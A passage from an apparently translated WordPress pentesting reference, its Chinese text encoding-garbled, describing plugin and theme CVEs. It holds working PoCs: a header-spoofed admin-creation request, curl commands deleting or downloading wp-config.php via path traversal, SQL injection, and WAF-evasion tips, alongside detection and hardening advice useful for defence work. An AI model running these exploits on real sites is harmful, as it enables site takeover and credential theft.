- Impact: æœªç»èº«ä»½éªŒè¯çš„æƒé™æå‡ä¸ºç®¡ç†å‘˜ï¼Œæ”»å‡»è€…å¯é€šè¿‡æ ¸å¿ƒ users REST è·¯ç”±åˆ›å»ºæ–°çš„ç®¡ç†å‘˜ã€‚
- Example header: `X-Wcpay-Platform-Checkout-User: 1` (å¼ºåˆ¶ä½¿ç”¨ç”¨æˆ· ID 1ï¼Œé€šå¸¸æ˜¯ç¬¬ä¸€ä¸ªç®¡ç†å‘˜è´¦å·)ã€‚
- Exploited route: `POST /wp-json/wp/v2/users` with an elevated role array.

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
ä¸ºä»€ä¹ˆå¯è¡Œ

- æ’ä»¶å°†å®¢æˆ·ç«¯å¯æ§çš„å¤´æ˜ å°„åˆ°è®¤è¯çŠ¶æ€å¹¶è·³è¿‡æƒé™ï¼ˆcapabilityï¼‰æ£€æŸ¥ã€‚
- WordPress core å¯¹è¯¥è·¯ç”±æœŸæœ› `create_users` capabilityï¼›è¯¥æ’ä»¶çš„ç»•è¿‡é€šè¿‡ç›´æ¥ä»å¤´è®¾ç½®å½“å‰ç”¨æˆ·ä¸Šä¸‹æ–‡æ¥é¿å¼€å®ƒã€‚

é¢„æœŸæˆåŠŸæŒ‡æ ‡

- è¿”å› HTTP 201ï¼Œå¹¶å¸¦æœ‰æè¿°æ‰€åˆ›å»ºç”¨æˆ·çš„ JSON æ­£æ–‡ã€‚
- åœ¨ `wp-admin/users.php` ä¸­å¯è§ä¸€ä¸ªæ–°çš„ç®¡ç†å‘˜ç”¨æˆ·ã€‚

æ£€æµ‹æ¸…å•

- æœç´¢ `getallheaders()`ã€`$_SERVER['HTTP_...']`ï¼Œæˆ–è¯»å–è‡ªå®šä¹‰å¤´ä»¥è®¾ç½®ç”¨æˆ·ä¸Šä¸‹æ–‡çš„ç¬¬ä¸‰æ–¹ SDKï¼ˆä¾‹å¦‚ `wp_set_current_user()`ã€`wp_set_auth_cookie()`ï¼‰ã€‚
- å®¡æŸ¥ REST æ³¨å†Œï¼ŒæŸ¥æ‰¾ç¼ºä¹å¥å£® `permission_callback` æ£€æŸ¥è€Œè½¬è€Œä¾èµ–è¯·æ±‚å¤´çš„ç‰¹æƒå›è°ƒã€‚
- æŸ¥æ‰¾åœ¨ REST å¤„ç†å™¨ä¸­ä»…é€šè¿‡å¤´å€¼è¿›è¡Œé—¨æ§çš„æ ¸å¿ƒç”¨æˆ·ç®¡ç†å‡½æ•°ï¼ˆ`wp_insert_user`ã€`wp_create_user`ï¼‰çš„ä½¿ç”¨æƒ…å†µã€‚

åŠ å›º

- åˆ‡å‹¿ä»å®¢æˆ·ç«¯å¯æ§çš„å¤´å¯¼å‡ºè®¤è¯æˆ–æˆæƒã€‚
- å¦‚æœåå‘ä»£ç†å¿…é¡»æ³¨å…¥èº«ä»½ä¿¡æ¯ï¼Œåº”åœ¨ä»£ç†å¤„ç»ˆæ­¢ä¿¡ä»»å¹¶å‰¥ç¦»å…¥ç«™å‰¯æœ¬ï¼ˆä¾‹å¦‚åœ¨è¾¹ç¼˜å¤„ `unset X-Wcpay-Platform-Checkout-User`ï¼‰ï¼Œç„¶åä¼ é€’ç­¾åä»¤ç‰Œå¹¶åœ¨æœåŠ¡å™¨ç«¯éªŒè¯å®ƒã€‚
- å¯¹äºæ‰§è¡Œç‰¹æƒæ“ä½œçš„ REST è·¯ç”±ï¼Œè¦æ±‚ä½¿ç”¨ `current_user_can()` æ£€æŸ¥å’Œä¸¥æ ¼çš„ `permission_callback`ï¼ˆä¸è¦ä½¿ç”¨ `__return_true`ï¼‰ã€‚
- ä¼˜å…ˆä½¿ç”¨ç¬¬ä¸€æ–¹è®¤è¯ï¼ˆcookiesã€application passwordsã€OAuthï¼‰ï¼Œè€Œä¸æ˜¯é€šè¿‡å¤´è¿›è¡Œâ€œå†’å……â€ã€‚

References: see the links at the end of this page for a public case and broader analysis.

### é€šè¿‡ wp_ajax_nopriv çš„æœªè®¤è¯ä»»æ„æ–‡ä»¶åˆ é™¤ (Litho Theme <= 3.0)

WordPress ä¸»é¢˜å’Œæ’ä»¶ç»å¸¸é€šè¿‡ `wp_ajax_` å’Œ `wp_ajax_nopriv_` é’©å­æš´éœ² AJAX å¤„ç†å™¨ã€‚  å½“ä½¿ç”¨ **_nopriv_** å˜ä½“æ—¶ **å›è°ƒå°†å¯¹æœªè®¤è¯è®¿å®¢å¯è¾¾**ï¼Œå› æ­¤ä»»ä½•æ•æ„Ÿæ“ä½œå¿…é¡»é¢å¤–å®ç°ï¼š

1. ä¸€ä¸ª **æƒé™ï¼ˆcapabilityï¼‰æ£€æŸ¥**ï¼ˆä¾‹å¦‚ `current_user_can()` æˆ–è‡³å°‘ `is_user_logged_in()`ï¼‰ï¼Œä»¥åŠ
2. ä¸€ä¸ªä½¿ç”¨ `check_ajax_referer()` / `wp_verify_nonce()` éªŒè¯çš„ **CSRF nonce**ï¼Œä»¥åŠ
3. **ä¸¥æ ¼çš„è¾“å…¥æ¶ˆæ¯’ / éªŒè¯**ã€‚

The Litho multipurpose theme (< 3.1) forgot those 3 controls in the *Remove Font Family* feature and ended up shipping the following code (simplified):
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
æ­¤ç‰‡æ®µå¼•å…¥çš„é—®é¢˜ï¼š

* **Unauthenticated access** â€“ å·²æ³¨å†Œ `wp_ajax_nopriv_` hookã€‚
* **No nonce / capability check** â€“ ä»»ä½•è®¿å®¢éƒ½å¯ä»¥è®¿é—®è¯¥ endpointã€‚
* **No path sanitisation** â€“ ç”¨æˆ·æ§åˆ¶çš„ `fontfamily` å­—ç¬¦ä¸²åœ¨æœªè¿‡æ»¤çš„æƒ…å†µä¸‹è¢«æ‹¼æ¥åˆ°æ–‡ä»¶ç³»ç»Ÿè·¯å¾„ï¼Œå…è®¸ç»å…¸çš„ `../../` éå†ã€‚

#### åˆ©ç”¨

æ”»å‡»è€…å¯ä»¥é€šè¿‡å‘é€å•ä¸ª HTTP POST è¯·æ±‚åˆ é™¤ä½äº **uploads åŸºç›®å½• ä»¥ä¸‹** çš„ä»»ä½•æ–‡ä»¶æˆ–ç›®å½•ï¼ˆé€šå¸¸ä¸º `<wp-root>/wp-content/uploads/`ï¼‰ï¼š
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
å› ä¸º `wp-config.php` ä½äº *uploads* ä¹‹å¤–ï¼Œåœ¨é»˜è®¤å®‰è£…ä¸­ï¼Œå››ä¸ª `../` åºåˆ—å°±è¶³å¤Ÿäº†ã€‚åˆ é™¤ `wp-config.php` ä¼šåœ¨ä¸‹æ¬¡è®¿é—®æ—¶å¼ºåˆ¶ WordPress è¿›å…¥ *installation wizard*ï¼Œä»è€Œå®ç°å®Œæ•´ç«™ç‚¹æ¥ç®¡ï¼ˆæ”»å‡»è€…åªéœ€æä¾›æ–°çš„ DB é…ç½®å¹¶åˆ›å»ºä¸€ä¸ªç®¡ç†å‘˜ç”¨æˆ·ï¼‰ã€‚

å…¶ä»–æœ‰å½±å“çš„ç›®æ ‡åŒ…æ‹¬ plugin/theme `.php` æ–‡ä»¶ï¼ˆç”¨äºç ´åå®‰å…¨æ’ä»¶ï¼‰æˆ– `.htaccess` è§„åˆ™ã€‚

#### æ£€æµ‹æ¸…å•

* ä»»ä½• `add_action( 'wp_ajax_nopriv_...')` å›è°ƒï¼Œå¦‚æœè°ƒç”¨æ–‡ä»¶ç³»ç»Ÿè¾…åŠ©å‡½æ•°ï¼ˆ`copy()`, `unlink()`, `$wp_filesystem->delete()`, ç­‰ï¼‰ã€‚
* å°†æœªç»è¿‡æ¶ˆæ¯’çš„ç”¨æˆ·è¾“å…¥æ‹¼æ¥åˆ°è·¯å¾„ä¸­ï¼ˆæŸ¥æ‰¾ `$_POST`, `$_GET`, `$_REQUEST`ï¼‰ã€‚
* ç¼ºå°‘ `check_ajax_referer()` å’Œ `current_user_can()`/`is_user_logged_in()`ã€‚

#### åŠ å›º
```php
function secure_remove_font_family() {
if ( ! is_user_logged_in() ) {
wp_send_json_error( 'forbidden', 403 );
}
check_ajax_referer( 'litho_fonts_nonce' );

$fontfamily = sanitize_file_name( wp_unslash( $_POST['fontfamily'] ?? '' ) );
$srcdir = trailingslashit( wp_upload_dir()['basedir'] ) . 'litho-fonts/' . $fontfamily;

if ( ! str_starts_with( realpath( $srcdir ), realpath( wp_upload_dir()['basedir'] ) ) ) {
wp_send_json_error( 'invalid path', 400 );
}
// â€¦ proceed â€¦
}
add_action( 'wp_ajax_litho_remove_font_family_action_data', 'secure_remove_font_family' );
//  ğŸ”’  NO wp_ajax_nopriv_ registration
```
> [!TIP]
> **å§‹ç»ˆ** å°†ä»»ä½•å¯¹ç£ç›˜çš„å†™å…¥/åˆ é™¤æ“ä½œè§†ä¸ºéœ€è¦ç‰¹æƒçš„æ“ä½œå¹¶è¿›è¡ŒäºŒæ¬¡æ£€æŸ¥ï¼š
> â€¢ Authentication  â€¢ Authorisation  â€¢ Nonce  â€¢ Input sanitisation  â€¢ Path containment (e.g. via `realpath()` plus `str_starts_with()`).

---

### Privilege escalation é€šè¿‡è¿‡æ—¶çš„è§’è‰²æ¢å¤å’Œç¼ºå°‘æˆæƒ (ASE "View Admin as Role")

è®¸å¤šæ’ä»¶é€šè¿‡å°†åŸå§‹è§’è‰²ä¿å­˜åœ¨ user meta ä¸­ä»¥ä¾¿ç¨åæ¢å¤ï¼Œæ¥å®ç° "view as role" æˆ–ä¸´æ—¶è§’è‰²åˆ‡æ¢åŠŸèƒ½ã€‚å¦‚æœæ¢å¤è·¯å¾„ä»…ä¾èµ–è¯·æ±‚å‚æ•°ï¼ˆä¾‹å¦‚ `$_REQUEST['reset-for']`ï¼‰å’Œæ’ä»¶ç»´æŠ¤çš„åˆ—è¡¨ï¼Œè€Œæ²¡æœ‰æ£€æŸ¥æƒé™å’Œæœ‰æ•ˆçš„ nonceï¼Œè¿™å°±ä¼šæˆä¸ºä¸€æ¬¡å‚ç›´çš„æƒé™æå‡ã€‚

åœ¨ Admin and Site Enhancements (ASE) æ’ä»¶ï¼ˆâ‰¤ 7.6.2.1ï¼‰ä¸­å‘ç°äº†ä¸€ä¸ªçœŸå®æ¡ˆä¾‹ã€‚reset åˆ†æ”¯ä¼šåŸºäº `reset-for=<username>` æ¢å¤è§’è‰²ï¼Œå¦‚æœè¯¥ç”¨æˆ·åå‡ºç°åœ¨å†…éƒ¨æ•°ç»„ `$options['viewing_admin_as_role_are']` ä¸­ï¼Œä½†åœ¨ç§»é™¤å½“å‰è§’è‰²å¹¶ä» user meta `_asenha_view_admin_as_original_roles` é‡æ–°æ·»åŠ ä¿å­˜çš„è§’è‰²ä¹‹å‰ï¼Œæ—¢æ²¡æœ‰è¿›è¡Œ `current_user_can()` æ£€æŸ¥ï¼Œä¹Ÿæ²¡æœ‰è¿›è¡Œ nonce éªŒè¯ï¼š
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
ä¸ºä»€ä¹ˆå¯è¢«åˆ©ç”¨

- ä¿¡ä»» `$_REQUEST['reset-for']` å’Œä¸€ä¸ªæ’ä»¶é€‰é¡¹è€Œæ²¡æœ‰è¿›è¡ŒæœåŠ¡å™¨ç«¯æˆæƒã€‚
- å¦‚æœç”¨æˆ·å…ˆå‰åœ¨ `_asenha_view_admin_as_original_roles` ä¸­ä¿å­˜äº†æ›´é«˜çš„æƒé™å¹¶è¢«é™çº§ï¼Œä»–ä»¬å¯ä»¥é€šè¿‡è®¿é—®é‡ç½®è·¯å¾„æ¢å¤è¿™äº›æƒé™ã€‚
- åœ¨æŸäº›éƒ¨ç½²ä¸­ï¼Œä»»ä½•å·²è®¤è¯çš„ç”¨æˆ·éƒ½å¯ä»¥ä¸ºä»å­˜åœ¨äº `viewing_admin_as_role_are` çš„å¦ä¸€ä¸ªç”¨æˆ·åè§¦å‘é‡ç½®ï¼ˆæˆæƒæœºåˆ¶æŸåï¼‰ã€‚

æ”»å‡»å…ˆå†³æ¡ä»¶

- å¯ç”¨äº†è¯¥åŠŸèƒ½çš„æ˜“å—æ”»å‡»çš„æ’ä»¶ç‰ˆæœ¬ã€‚
- ç›®æ ‡è´¦å·åœ¨ user meta ä¸­ä¿ç•™äº†å…ˆå‰ä½¿ç”¨é—ç•™çš„é«˜æƒé™è§’è‰²ã€‚
- ä»»ä½•å·²è®¤è¯çš„ä¼šè¯ï¼›é‡ç½®æµç¨‹ç¼ºå°‘ nonce/capabilityã€‚

åˆ©ç”¨ï¼ˆç¤ºä¾‹ï¼‰
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
åœ¨æ˜“å—æ”»å‡»çš„æ„å»ºä¸­ï¼Œè¿™ä¼šç§»é™¤å½“å‰è§’è‰²å¹¶é‡æ–°æ·»åŠ å·²ä¿å­˜çš„â€œåŸå§‹è§’è‰²â€ï¼ˆä¾‹å¦‚ `administrator`ï¼‰ï¼Œä»è€Œæœ‰æ•ˆåœ°æå‡æƒé™ã€‚

Detection checklist

- æŸ¥æ‰¾å°†â€œåŸå§‹è§’è‰²â€ä¿å­˜åœ¨ user meta ä¸­çš„è§’è‰²åˆ‡æ¢åŠŸèƒ½ï¼ˆä¾‹å¦‚ `_asenha_view_admin_as_original_roles`ï¼‰ã€‚
- è¯†åˆ«é‡ç½®/æ¢å¤è·¯å¾„ï¼Œè¿™äº›è·¯å¾„ï¼š
- ä» `$_REQUEST` / `$_GET` / `$_POST` è¯»å–ç”¨æˆ·åã€‚
- é€šè¿‡ `add_role()` / `remove_role()` ä¿®æ”¹è§’è‰²ä½†æœªä½¿ç”¨ `current_user_can()` å’Œ `wp_verify_nonce()` / `check_admin_referer()`ã€‚
- åŸºäºæ’ä»¶é€‰é¡¹æ•°ç»„ï¼ˆä¾‹å¦‚ `viewing_admin_as_role_are`ï¼‰è¿›è¡Œæˆæƒï¼Œè€Œä¸æ˜¯åŸºäºæ‰§è¡Œè€…çš„æƒé™ï¼ˆcapabilitiesï¼‰ã€‚

Hardening

- åœ¨æ¯ä¸ªä¼šæ”¹å˜çŠ¶æ€çš„åˆ†æ”¯ä¸Šå¼ºåˆ¶è¿›è¡Œæƒé™æ£€æŸ¥ï¼ˆä¾‹å¦‚ `current_user_can('manage_options')` æˆ–æ›´ä¸¥æ ¼çš„æ£€æŸ¥ï¼‰ã€‚
- å¯¹æ‰€æœ‰è§’è‰²/æƒé™å˜æ›´è¦æ±‚ä½¿ç”¨ nonces å¹¶è¿›è¡ŒéªŒè¯ï¼š`check_admin_referer()` / `wp_verify_nonce()`ã€‚
- ç»ä¸ä¿¡ä»»è¯·æ±‚ä¸­æä¾›çš„ç”¨æˆ·åï¼›åº”åŸºäºå·²è®¤è¯çš„æ‰§è¡Œè€…å’Œæ˜ç¡®çš„ç­–ç•¥åœ¨æœåŠ¡å™¨ç«¯è§£æç›®æ ‡ç”¨æˆ·ã€‚
- åœ¨é…ç½®æ–‡ä»¶/è§’è‰²æ›´æ–°æ—¶ä½¿â€œåŸå§‹è§’è‰²â€çŠ¶æ€å¤±æ•ˆï¼Œä»¥é¿å…é™ˆæ—§çš„é«˜æƒé™è¢«æ¢å¤ï¼š
```php
add_action( 'profile_update', function( $user_id ) {
delete_user_meta( $user_id, '_asenha_view_admin_as_original_roles' );
}, 10, 1 );
```
- è€ƒè™‘å­˜å‚¨æœ€å°‘çŠ¶æ€ï¼Œå¹¶åœ¨ä¸´æ—¶è§’è‰²åˆ‡æ¢æ—¶ä½¿ç”¨ time-limitedã€capability-guarded tokensã€‚

---

### WAF åœ¨ WordPress/plugin CVEs ä¸Šçš„è€ƒè™‘

é€šç”¨çš„ edge/server WAFs é€šå¸¸é’ˆå¯¹å¹¿æ³›çš„æ¨¡å¼è¿›è¡Œè°ƒä¼˜ï¼ˆSQLiã€XSSã€LFIï¼‰ã€‚è®¸å¤šé«˜å±çš„ WordPress/plugin æ¼æ´æ˜¯ç‰¹å®šäºåº”ç”¨çš„é€»è¾‘/è®¤è¯ç¼ºé™·ï¼Œé™¤éå¼•æ“ç†è§£ WordPress è·¯ç”±å’Œ plugin è¯­ä¹‰ï¼Œå¦åˆ™è¿™äº›è¯·æ±‚çœ‹èµ·æ¥åƒæ­£å¸¸æµé‡ã€‚

Offensive notes

- é’ˆå¯¹ plugin ç‰¹å®šçš„ç«¯ç‚¹ä½¿ç”¨å¹²å‡€çš„ payloadsï¼š`admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- å…ˆå°è¯•æœªè®¤è¯è·¯å¾„ï¼ˆAJAX `nopriv`, REST with permissive `permission_callback`, public shortcodesï¼‰ã€‚é»˜è®¤çš„ payloads é€šå¸¸åœ¨ä¸è¿›è¡Œæ··æ·†çš„æƒ…å†µä¸‹å°±èƒ½æˆåŠŸã€‚
- å¸¸è§çš„é«˜å±æƒ…å½¢ï¼šprivilege escalation (broken access control), arbitrary file upload/download, LFI, open redirect.

Defensive notes

- ä¸è¦ä»…ä¾èµ–é€šç”¨çš„ WAF ç­¾åæ¥ä¿æŠ¤ plugin CVEsã€‚åº”å®ç° application-layerã€vulnerability-specific çš„è™šæ‹Ÿè¡¥ä¸æˆ–å°½å¿«æ›´æ–°ã€‚
- åœ¨ä»£ç ä¸­ä¼˜å…ˆä½¿ç”¨æ­£å‘å®‰å…¨æ£€æŸ¥ï¼ˆcapabilities, nonces, ä¸¥æ ¼çš„è¾“å…¥éªŒè¯ï¼‰ï¼Œè€Œä¸æ˜¯åŸºäºè´Ÿå‘çš„ regex è¿‡æ»¤ã€‚

## WordPress ä¿æŠ¤

### å®šæœŸæ›´æ–°

ç¡®ä¿ WordPressã€plugins å’Œ themes éƒ½æ˜¯æœ€æ–°çš„ã€‚è¿˜è¦ç¡®è®¤åœ¨ wp-config.php ä¸­å¯ç”¨äº†è‡ªåŠ¨æ›´æ–°ï¼š
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
å¦å¤–ï¼Œ**åªå®‰è£…å¯ä¿¡èµ–çš„ WordPress æ’ä»¶å’Œä¸»é¢˜**ã€‚

### å®‰å…¨æ’ä»¶

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **å…¶ä»–å»ºè®®**

- åˆ é™¤é»˜è®¤ **admin** ç”¨æˆ·
- ä½¿ç”¨ **å¼ºå¯†ç ** å’Œ **2FA**
- å®šæœŸ **å®¡æŸ¥** ç”¨æˆ· **æƒé™**
- **é™åˆ¶ç™»å½•å°è¯•** ä»¥é˜²æ­¢ Brute Force æ”»å‡»
- é‡å‘½å **`wp-admin.php`** æ–‡ä»¶ï¼Œå¹¶ä»…å…è®¸ä»å†…éƒ¨æˆ–æŸäº› IP åœ°å€è®¿é—®ã€‚


### Unauthenticated SQL Injection via insufficient validation (WP Job Portal <= 2.3.2)

WP Job Portal æ‹›è˜æ’ä»¶æš´éœ²äº†ä¸€ä¸ª **savecategory** ä»»åŠ¡ï¼Œè¯¥ä»»åŠ¡æœ€ç»ˆåœ¨ `modules/category/model.php::validateFormData()` å†…æ‰§è¡Œä»¥ä¸‹æ˜“å—æ”»å‡»çš„ä»£ç ï¼š
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat âœ—
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Issues introduced by this snippet:

1. **Unsanitised user input** â€“ `parentid` comes straight from the HTTP request.
2. **String concatenation inside the WHERE clause** â€“ no `is_numeric()` / `esc_sql()` / prepared statement.
3. **Unauthenticated reachability** â€“ although the action is executed through `admin-post.php`, the only check in place is a **CSRF nonce** (`wp_verify_nonce()`), which any visitor can retrieve from a public page embedding the shortcode `[wpjobportal_my_resumes]`.

#### åˆ©ç”¨

1. è·å–ä¸€ä¸ªæ–°çš„ nonce:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. é€šè¿‡æ»¥ç”¨ `parentid` æ³¨å…¥ä»»æ„ SQL:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
The response discloses the result of the injected query or alters the database, proving SQLi.


### æœªè®¤è¯çš„ä»»æ„æ–‡ä»¶ä¸‹è½½ / è·¯å¾„éå† (WP Job Portal <= 2.3.2)

å¦ä¸€ä¸ªä»»åŠ¡ï¼Œ**downloadcustomfile**ï¼Œå…è®¸è®¿é—®è€…é€šè¿‡è·¯å¾„éå†ä¸‹è½½ç£ç›˜ä¸Šçš„ **ä»»æ„æ–‡ä»¶**ã€‚æ˜“å—æ”»å‡»çš„å‡½æ•°ä½äº `modules/customfield/model.php::downloadCustomUploadedFile()`ï¼š
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` ç”±æ”»å‡»è€…æ§åˆ¶å¹¶è¢«æ‹¼æ¥ **æœªè¿›è¡Œæ¸…ç†**ã€‚å†æ¬¡è¯´æ˜ï¼Œå”¯ä¸€çš„å…³å¡æ˜¯ä¸€ä¸ª **CSRF nonce**ï¼Œå¯ä»¥ä»ç®€å†é¡µé¢è·å–ã€‚

#### Exploitation
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
æœåŠ¡å™¨å“åº” `wp-config.php` çš„å†…å®¹ï¼Œleaking DB credentials and auth keysã€‚

## å‚è€ƒèµ„æ–™

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset â€“ delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments â‰¤ 5.6.1 â€“ Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)

{{#include ../../banners/hacktricks-training.md}}
